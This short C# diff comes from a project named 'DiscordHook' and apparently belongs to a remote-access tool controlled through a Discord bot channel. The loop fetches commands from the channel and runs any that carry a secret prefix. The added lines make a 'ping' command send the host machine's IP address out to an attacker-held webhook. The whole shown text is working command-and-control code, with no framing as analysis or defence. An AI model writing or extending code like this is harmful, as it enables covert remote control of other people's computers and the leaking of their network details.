@@ -29,6 +29,12 @@ namespace DiscordHook
             {
                 await Task.Delay(1000);
                 var command = await GetCommand(botToken, channelurl);
+                if (command == "ping")
+                {
+                    await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);
+                    await SendStringHook("null", alerthook);
+                }
+                    
                 if (command == "null" || !command.Contains(hashprefix) ) continue;
                 await HandleCmd(command.Substring(65), replyhook, commandhook);
             }
